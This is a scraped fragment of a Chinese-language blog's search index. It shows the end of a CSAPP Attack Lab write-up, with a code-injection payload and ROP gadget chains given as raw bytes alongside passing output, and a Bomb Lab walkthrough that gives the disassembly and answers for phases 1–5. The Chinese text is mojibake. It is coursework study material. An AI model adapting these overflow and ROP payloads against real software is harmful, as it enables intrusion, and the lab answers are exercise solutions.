&lt;pre&gt;&lt;code&gt;48 c7 c7 93 dc 61 55 48 83 ec 28 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00  78 dc 61 55
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;é€šè¿‡&#34;&gt;é€šè¿‡ï¼ï¼ï¼&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./ctarget -q -i exploit3-raw.txt 
Cookie: 0x59b997fa
Touch3!: You called touch3(&amp;quot;59b997fa&amp;quot;)
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 93 DC 61 55 48 83 EC 28 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 78 DC 61 55
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;rtarget&#34;&gt;rtarget&lt;/h2&gt;
&lt;h3 id=&#34;1&#34;&gt;1&lt;/h3&gt;
&lt;p&gt;rtargetè¦æ±‚æˆ‘ä»¬è¿›è¡ŒROPæ”»å‡»ï¼Œå› ä¸ºæ ˆéšæœºåŒ–ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½åƒä¹‹å‰ä¸€æ ·æŒ‡å®šåœ°å€ï¼Œåªèƒ½ä¾é ä»£ç ä¸­åŸæœ‰çš„gadgetè¿›è¡Œå…¥ä¾µã€‚&lt;br&gt;
æˆ‘çš„æƒ³æ³•æ˜¯å…ˆæŠŠcookie popåˆ°æŸä¸ªå¯„å­˜å™¨ä¸­ï¼Œç„¶åå†movåˆ°rdié‡Œé¢ã€‚&lt;br&gt;
å‚è€ƒäº†å®éªŒæ‰‹å†Œï¼Œæ£€ç´¢äº†framéƒ¨åˆ†çš„ä»£ç åå‘ç°åªæœ‰ &lt;code&gt;58&lt;/code&gt;Â å¯ä»¥ä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯ &lt;code&gt;popq %rax&lt;/code&gt;Â &lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_74f7a02a83c7342936036627bf6b81df.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç„¶åå¯»æ‰¾åˆ°ä¸€æ®µ &lt;code&gt;movq %rax,%rdi&lt;/code&gt;Â çš„æŒ‡ä»¤ã€‚&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_519414af020393b2e70643e9fd7c701e.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è¿™ä¸¤ä¸ªå°±æ˜¯æˆ‘ä»¬ä½¿ç”¨çš„gaggetï¼Œåœ°å€åˆ†åˆ«æ˜¯ &lt;code&gt;0x4019ab&lt;/code&gt;Â å’ŒÂ· &lt;code&gt;0x4019a2&lt;/code&gt;ã€‚&lt;br&gt;
å°†ä»–ä»¬è¿ç»­æ‰§è¡Œå°±ä¼šæ˜¯å¦‚ä¸‹æƒ…å½¢ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;popq %rax
nop
ret
movq %rax,%rdi
ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘ä»¬åªç”¨å‡†å¤‡å¥½popå‡ºçš„æ•°æ®å’Œè¿”å›ä½ç½®å³å¯ã€‚&lt;br&gt;
è¿™é‡Œè¦æ³¨æ„æ ˆæ˜¯å‘é«˜å­—èŠ‚æ”¶ç¼©ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠæˆ‘ä»¬çš„æ’å…¥ç‰‡æ®µæ”¾åœ¨40å­—èŠ‚ç¼“å†²åŒºåé¢ã€‚&lt;br&gt;
åº”è¯¥æ’å…¥çš„ä»£ç å¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ec 17 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a2 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å‰40ä¸ªå­—èŠ‚æ²¡æœ‰å®é™…æ„ä¹‰ï¼Œåé¢æŒ‡å®šè¿”å›åœ°å€ä¸å‡†å¤‡popå‡ºçš„æ•°æ®&lt;/p&gt;
&lt;h3 id=&#34;2&#34;&gt;2&lt;/h3&gt;
&lt;p&gt;æœ‰äº›å¤æ‚ï¼Œç›´æ¥è´´å‡ºæ¥äº†&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;35 39 62 39 39 37 66 61
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00            06 1a 40 00 00 00 00 00            /* mov %rsp,%rax */
a2 19 40 00 00 00 00 00            /* mov %rax,%rdi */

ab 19 40 00 00 00 00 00            /* pop %rax */
48 00 00 00 00 00 00 00

dd 19 40 00 00 00 00 00            /* mov %eax,%edx */
70 1a 40 00 00 00 00 00            /* mov %edx,%ecx */
13 1a 40 00 00 00 00 00            /* mov %ecx,%esi */
d6 19 40 00 00 00 00 00            /* lea (%rdi,%rsi,1),%rax */
a2 19 40 00 00 00 00 00            /* mov %rax,%rdi */
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61            /* cookie string */
00 00 00 00 00 00 00 00
&lt;/code&gt;&lt;/pre&gt;
">CSAPP: Attacklab</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/uscxh7_qulnpm/"" data-c="
          &lt;p&gt;Bomblabæ˜¯CSAPPç¬¬ä¸‰ç« çš„é…å¥—labï¼Œä¸»è¦ä»»åŠ¡æ˜¯é€šè¿‡åæ±‡ç¼–è§£è°œã€‚&lt;br&gt;
åæ±‡ç¼–æ¶‰åŠåˆ°GDBçš„ä½¿ç”¨ï¼Œå¯ä»¥å‚è€ƒ&lt;a href=&#34;http://csapp.cs.cmu.edu/2e/docs/gdbnotes-x86-64.pdf&#34;&gt;è¿™é‡Œ&lt;/a&gt;&lt;br&gt;
å®éªŒå¼€å§‹é¦–å…ˆä½¿ç”¨ &lt;code&gt;objdump -d bomb &amp;gt; bomb.txt&lt;/code&gt; å°†åæ±‡ç¼–æ–‡ä»¶é‡å®šå‘åˆ°txtæ–¹ä¾¿æŸ¥çœ‹ã€‚&lt;/p&gt;
&lt;h3 id=&#34;phase_1&#34;&gt;phase_1&lt;/h3&gt;
&lt;p&gt;åœ¨346è¡Œæ‰¾åˆ°phase_1çš„ä»£ç æ®µ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0000000000400ee0 &amp;lt;phase_1&amp;gt;:
 400ee0:	48 83 ec 08          	sub    $0x8,%rsp
 400ee4:	be 00 24 40 00        mov    $0x402400,%esi
 400ee9:	e8 4a 04 00 00        callq  401338 &amp;lt;strings_not_equal&amp;gt;
 400eee:	85 c0                	test   %eax,%eax
 400ef0:	74 05                	je     400ef7 &amp;lt;phase_1+0x17&amp;gt;
 400ef2:	e8 43 05 00 00        callq  40143a &amp;lt;explode_bomb&amp;gt;
 400ef7:	48 83 c4 08          	add    $0x8,%rsp
 400efb:	c3                    retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥çœ‹å‡ºæ˜¯ç¬¬äºŒè¡Œä¼ å…¥ä¸€ä¸ªåœ°å€ç»™%esiï¼Œ ç„¶åè°ƒç”¨å‡½æ•° &lt;code&gt;callq 401338 &amp;lt;strings_not_equal&amp;gt;&lt;/code&gt; è°ƒç”¨å‡½æ•°ï¼Œä¹‹åå¯¹è¿”å›å€¼ï¼ˆåœ¨%eaxä¸­ï¼‰è¿›è¡Œæµ‹è¯•ï¼Œå¦‚æœæ˜¯0ï¼Œåˆ™è·³è¿‡ &lt;code&gt;callq 40143a &amp;lt;explode_bomb&amp;gt;&lt;/code&gt; çˆ†ç‚¸å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡æ˜¯è®©&lt;code&gt;strings_not_equal&lt;/code&gt;å‡½æ•°è¿”å›0ï¼ŒçŒœæµ‹æˆ‘ä»¬éœ€è¦è¾“å…¥çš„å­—ç¬¦ä¸²åº”è¯¥ä¸åœ°å€ &lt;code&gt;$0x402400&lt;/code&gt; æœ‰å…³&lt;br&gt;
æ‰“å¼€gdbè°ƒè¯•&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gdb bomb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è®¾ç½®æ–­ç‚¹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) break phase_1
Breakpoint 1 at 0x400ee0
(gdb) break strings_not_equal
Breakpoint 2 at 0x401338
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æŸ¥çœ‹ &lt;code&gt;0x402400&lt;/code&gt; å¤„çš„å€¼&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-a&#34;&gt;(gdb) x/s 0x402400
0x402400:       &amp;quot;Border relations with Canada have never been better.&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é€€å‡ºgdbé‡æ–°è¿è¡Œbomb&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_e00a5fadb5b77735fb376642bdb85949.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç¬¬ä¸€å…³é€šè¿‡ï¼ï¼ï¼&lt;/p&gt;
&lt;h3 id=&#34;phase_2&#34;&gt;phase_2&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;0000000000400efc &amp;lt;phase_2&amp;gt;:
  400efc:	55                   	push   %rbp
  400efd:	53                   	push   %rbx
  400efe:	48 83 ec 28          	sub    $0x28,%rsp
  400f02:	48 89 e6             	mov    %rsp,%rsi
  400f05:	e8 52 05 00 00       	callq  40145c &amp;lt;read_six_numbers&amp;gt;
  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)
  400f0e:	74 20                	je     400f30 &amp;lt;phase_2+0x34&amp;gt;
  400f10:	e8 25 05 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400f15:	eb 19                	jmp    400f30 &amp;lt;phase_2+0x34&amp;gt;
  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax
  400f1a:	01 c0                	add    %eax,%eax
  400f1c:	39 03                	cmp    %eax,(%rbx)
  400f1e:	74 05                	je     400f25 &amp;lt;phase_2+0x29&amp;gt;
  400f20:	e8 15 05 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400f25:	48 83 c3 04          	add    $0x4,%rbx
  400f29:	48 39 eb             	cmp    %rbp,%rbx
  400f2c:	75 e9                	jne    400f17 &amp;lt;phase_2+0x1b&amp;gt;
  400f2e:	eb 0c                	jmp    400f3c &amp;lt;phase_2+0x40&amp;gt;
  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx
  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp
  400f3a:	eb db                	jmp    400f17 &amp;lt;phase_2+0x1b&amp;gt;
  400f3c:	48 83 c4 28          	add    $0x28,%rsp
  400f40:	5b                   	pop    %rbx
  400f41:	5d                   	pop    %rbp
  400f42:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç¬¬äºŒå…³ç¬é—´å˜é•¿æœ‰æœ¨æœ‰&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹ &lt;code&gt;read_six_numbers&lt;/code&gt; çš„ä»£ç &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;000000000040145c &amp;lt;read_six_numbers&amp;gt;:
  40145c:	48 83 ec 18          	sub    $0x18,%rsp
  401460:	48 89 f2             	mov    %rsi,%rdx
  401463:	48 8d 4e 04          	lea    0x4(%rsi),%rcx
  401467:	48 8d 46 14          	lea    0x14(%rsi),%rax
  40146b:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
  401470:	48 8d 46 10          	lea    0x10(%rsi),%rax
  401474:	48 89 04 24          	mov    %rax,(%rsp)
  401478:	4c 8d 4e 0c          	lea    0xc(%rsi),%r9
  40147c:	4c 8d 46 08          	lea    0x8(%rsi),%r8
  401480:	be c3 25 40 00       	mov    $0x4025c3,%esi
  401485:	b8 00 00 00 00       	mov    $0x0,%eax
  40148a:	e8 61 f7 ff ff       	callq  400bf0 &amp;lt;__isoc99_sscanf@plt&amp;gt;
  40148f:	83 f8 05             	cmp    $0x5,%eax
  401492:	7f 05                	jg     401499 &amp;lt;read_six_numbers+0x3d&amp;gt;
  401494:	e8 a1 ff ff ff       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  401499:	48 83 c4 18          	add    $0x18,%rsp
  40149d:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç„¶è€Œå¹¶æ²¡æœ‰çœ‹æ‡‚...&lt;br&gt;
æ‰€ä»¥æ ¹æ®åå­—çŒœæµ‹å¯èƒ½æ˜¯è¯»å…¥å…­ä¸ªæ•°ï¼Œè€Œä¸”åœ¨è°ƒç”¨ä¹‹å‰ä¸ºä»–åˆ›å»ºäº†å‡½æ•°æ ˆï¼Œæ‰€ä»¥è¯»å–çš„å€¼å¯èƒ½åœ¨æ ˆä¸­&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  400efc:	55                   	push   %rbp
  400efd:	53                   	push   %rbx
  400efe:	48 83 ec 28          	sub    $0x28,%rsp
  400f02:	48 89 e6             	mov    %rsp,%rsi
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨å‡½æ•°è°ƒç”¨ç»“æŸçš„ä½ç½®åˆ›å»ºæ–­ç‚¹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) break *0x400f0a
Breakpoint 3 at 0x400f0a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;éšä¾¿è¾“å…¥6ä¸ªæ•°&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Phase 1 defused. How about the next one?
1 2 3 4 5 6
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æŸ¥çœ‹ä¸€ä¸‹&lt;code&gt;%rsp&lt;/code&gt;æœ€è¿‘çš„6ä¸ªæ•°&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/6wd $rsp
0x7fffffffe150: 1       2       3       4
0x7fffffffe160: 5       6
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;çœ‹æ¥ç¡®å®æ˜¯è¯»å–äº†6ä¸ªæ•°&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)      ç¬¬ä¸€ä¸ªæ•°æ˜¯1
  400f0e:	74 20                	je     400f30 &amp;lt;phase_2+0x34&amp;gt;
  400f10:	e8 25 05 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400f15:	eb 19                	jmp    400f30 &amp;lt;phase_2+0x34&amp;gt;
  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax
  400f1a:	01 c0                	add    %eax,%eax       åä¸€ä¸ªæ•°æ˜¯å‰ä¸€ä¸ªæ•°çš„ä¸¤å€
  400f1c:	39 03                	cmp    %eax,(%rbx)
  400f1e:	74 05                	je     400f25 &amp;lt;phase_2+0x29&amp;gt;
  400f20:	e8 15 05 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400f25:	48 83 c3 04          	add    $0x4,%rbx
  400f29:	48 39 eb             	cmp    %rbp,%rbx
  400f2c:	75 e9                	jne    400f17 &amp;lt;phase_2+0x1b&amp;gt;
  400f2e:	eb 0c                	jmp    400f3c &amp;lt;phase_2+0x40&amp;gt;
  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx
  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp
  400f3a:	eb db                	jmp    400f17 &amp;lt;phase_2+0x1b&amp;gt;
  400f3c:	48 83 c4 28          	add    $0x28,%rsp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ†æå‡ºç¬¬äºŒå…³çš„ç­”æ¡ˆæ˜¯&lt;code&gt;1 2 4 8 16 32&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Border relations with Canada have never been better.
Phase 1 defused. How about the next one?
1 2 4 8 16 32
That&#39;s number 2.  Keep going!
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;phase_3&#34;&gt;phase_3&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;  400f43:	48 83 ec 18          	sub    $0x18,%rsp
  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx
  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx
  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi
  400f56:	b8 00 00 00 00       	mov    $0x0,%eax
  400f5b:	e8 90 fc ff ff       	callq  400bf0 &amp;lt;__isoc99_sscanf@plt&amp;gt;
  400f60:	83 f8 01             	cmp    $0x1,%eax
  400f63:	7f 05                	jg     400f6a &amp;lt;phase_3+0x27&amp;gt;
  400f65:	e8 d0 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)
  400f6f:	77 3c                	ja     400fad &amp;lt;phase_3+0x6a&amp;gt;
  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax
  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)       //jmp 0x400fb9
  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax
  400f81:	eb 3b                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax
  400f88:	eb 34                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax
  400f8f:	eb 2d                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f91:	b8 85 01 00 00       	mov    $0x185,%eax
  400f96:	eb 26                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax
  400f9d:	eb 1f                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax
  400fa4:	eb 18                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax
  400fab:	eb 11                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400fad:	e8 88 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax
  400fb7:	eb 05                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax
  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax
  400fc2:	74 05                	je     400fc9 &amp;lt;phase_3+0x86&amp;gt;
  400fc4:	e8 71 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400fc9:	48 83 c4 18          	add    $0x18,%rsp
  400fcd:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ ¹æ®phase_2çŒœæµ‹&lt;code&gt;&amp;lt;__isoc99_sscanf@plt&amp;gt;&lt;/code&gt;åº”è¯¥æ˜¯ä¸€ä¸ªä»stdinè¾“å…¥çš„å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠæ–­ç‚¹æ‰“åœ¨ä»–åé¢ã€‚&lt;br&gt;
åå¤å°è¯•å‡ æ¬¡åå‘ç°ä¿å­˜åœ¨%eaxçš„è¿”å›å€¼åº”è¯¥æ˜¯è¾“å…¥å‚æ•°çš„ä¸ªæ•°ï¼Œéœ€è¦å¤§äºä¸€ä¸ªï¼Œä¹‹åä½¿ç”¨&lt;code&gt;mov 0x8(%rsp),%eax&lt;/code&gt;å°†ç¬¬ä¸€ä¸ªå‚æ•°ä¼ ç»™%eaxï¼Œé€šè¿‡%eaxçš„å€¼å†³å®š&lt;code&gt;jmpq *0x402470(,%rax,8)&lt;/code&gt;è·³è½¬åˆ°å“ªä¸€æ­¥ï¼Œæˆ‘ä¼ çš„æ˜¯1ï¼Œè·³è½¬åˆ°äº†&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  400fb7:	eb 05                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax
  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax
  400fc2:	74 05                	je     400fc9 &amp;lt;phase_3+0x86&amp;gt;
  400fc4:	e8 71 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400fc9:	48 83 c4 18          	add    $0x18,%rsp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å®¹æ˜“çœ‹å‡ºç¬¬äºŒä¸ªå‚æ•°åº”è¯¥æ˜¯&lt;code&gt;0x137&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;phase_4&#34;&gt;phase_4&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;000000000040100c &amp;lt;phase_4&amp;gt;:
  40100c:	48 83 ec 18          	sub    $0x18,%rsp
  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx
  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx
  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi
  40101f:	b8 00 00 00 00       	mov    $0x0,%eax
  401024:	e8 c7 fb ff ff       	callq  400bf0 &amp;lt;__isoc99_sscanf@plt&amp;gt;
  401029:	83 f8 02             	cmp    $0x2,%eax                   ä¸¤ä¸ªå‚æ•°
  40102c:	75 07                	jne    401035 &amp;lt;phase_4+0x29&amp;gt;
  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)              ç¬¬ä¸€ä¸ªå‚æ•°&amp;lt;=0xe (14)
  401033:	76 05                	jbe    40103a &amp;lt;phase_4+0x2e&amp;gt;
  401035:	e8 00 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt; 
  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx
  40103f:	be 00 00 00 00       	mov    $0x0,%esi
  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi
  401048:	e8 81 ff ff ff       	callq  400fce &amp;lt;func4&amp;gt;
  40104d:	85 c0                	test   %eax,%eax                   
  40104f:	75 07                	jne    401058 &amp;lt;phase_4+0x4c&amp;gt;        func4éœ€è¦è¿”å›0   
  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)               ç¬¬äºŒä¸ªå‚æ•°ä¸º0
  401056:	74 05                	je     40105d &amp;lt;phase_4+0x51&amp;gt;
  401058:	e8 dd 03 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  40105d:	48 83 c4 18          	add    $0x18,%rsp
  401061:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥æ¯”è¾ƒå®¹æ˜“è§£è¯»å‡ºè¿™å…³éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œä¸” &lt;code&gt;arg1&amp;lt;=14,arg2=0&lt;/code&gt;ï¼Œfunc4éœ€è¦è¿”å›0ï¼Œæ‰€ä»¥é‡ç‚¹æ˜¯å¯¹func4çš„è§£è¯»&lt;/p&gt;
&lt;h5 id=&#34;func4&#34;&gt;func4&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;  400fce:	48 83 ec 08          	sub    $0x8,%rsp
  400fd2:	89 d0                	mov    %edx,%eax
  400fd4:	29 f0                	sub    %esi,%eax
  400fd6:	89 c1                	mov    %eax,%ecx
  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx
  400fdb:	01 c8                	add    %ecx,%eax
  400fdd:	d1 f8                	sar    %eax                  
  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx    
  400fe2:	39 f9                	cmp    %edi,%ecx
  400fe4:	7e 0c                	jle    400ff2 &amp;lt;func4+0x24&amp;gt;
  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx
  400fe9:	e8 e0 ff ff ff       	callq  400fce &amp;lt;func4&amp;gt;
  400fee:	01 c0                	add    %eax,%eax
  400ff0:	eb 15                	jmp    401007 &amp;lt;func4+0x39&amp;gt;
  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax             
  400ff7:	39 f9                	cmp    %edi,%ecx                   
  400ff9:	7d 0c                	jge    401007 &amp;lt;func4+0x39&amp;gt;
  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi        
  400ffe:	e8 cb ff ff ff       	callq  400fce &amp;lt;func4&amp;gt;
  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax
  401007:	48 83 c4 08          	add    $0x8,%rsp
  40100b:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;func4ä¼ å…¥3ä¸ªå‚æ•° Â &lt;code&gt;arg1&lt;/code&gt; &lt;code&gt;0&lt;/code&gt; &lt;code&gt;14&lt;/code&gt; ,ç„¶åå°±ä¸æ˜¯å¾ˆçœ‹å¾—æ‡‚äº†...ä¸è¿‡ä»14å¾€ä¸‹è¯•ï¼Œä¹Ÿä¸æ˜¯å¾ˆå¤šï¼Œæœ€åå‘ç°arg1æ˜¯7&lt;br&gt;
æ‰€ä»¥ç­”æ¡ˆæ˜¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;7 0
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;phase_5&#34;&gt;phase_5&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;  401062:	53                   	push   %rbx
  401063:	48 83 ec 20          	sub    $0x20,%rsp
  401067:	48 89 fb             	mov    %rdi,%rbx
  40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401071:	00 00 
  401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)
  401078:	31 c0                	xor    %eax,%eax
  40107a:	e8 9c 02 00 00       	callq  40131b &amp;lt;string_length&amp;gt;
  40107f:	83 f8 06             	cmp    $0x6,%eax           ä¼°è®¡æ˜¯ä¸ª6ä½çš„å­—ç¬¦ä¸²
  401082:	74 4e                	je     4010d2 &amp;lt;phase_5+0x70&amp;gt;
  401084:	e8 b1 03 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  401089:	eb 47                	jmp    4010d2 &amp;lt;phase_5+0x70&amp;gt;
  40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx
  40108f:	88 0c 24             	mov    %cl,(%rsp)               
  401092:	48 8b 14 24          	mov    (%rsp),%rdx
  401096:	83 e2 0f             	and    $0xf,%edx                   ç•™ä¸‹æ¯ä¸ªå­—ç¬¦çš„ä½4ä½
  401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx         æŒ‰rdxçš„å€¼ä»maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?å–å­—
  4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)
  4010a4:	48 83 c0 01          	add    $0x1,%rax
  4010a8:	48 83 f8 06          	cmp    $0x6,%rax
  4010ac:	75 dd                	jne    40108b &amp;lt;phase_5+0x29&amp;gt;
  4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)
  4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi               flyers
  4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi
  4010bd:	e8 76 02 00 00       	callq  401338 &amp;lt;strings_not_equal&amp;gt;   å­—ç¬¦ä¸²åº”è¯¥ç­‰äºflyers
  4010c2:	85 c0                	test   %eax,%eax
  4010c4:	74 13                	je     4010d9 &amp;lt;phase_5+0x77&amp;gt;
  4010c6:	e8 6f 03 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  4010cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4010d0:	eb 07                	jmp    4010d9 &amp;lt;phase_5+0x77&amp;gt;
  4010d2:	b8 00 00 00 00       	mov    $0x0,%eax
  4010d7:	eb b2                	jmp    40108b &amp;lt;phase_5+0x29&amp;gt;
  4010d9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax
  4010de:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
  4010e5:	00 00 
  4010e7:	74 05                	je     4010ee &amp;lt;phase_5+0x8c&amp;gt;
  4010e9:	e8 42 fa ff ff       	callq  400b30 &amp;lt;__stack_chk_fail@plt&amp;gt;
  4010ee:	48 83 c4 20          	add    $0x20,%rsp
  4010f2:	5b                   	pop    %rbx
  4010f3:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
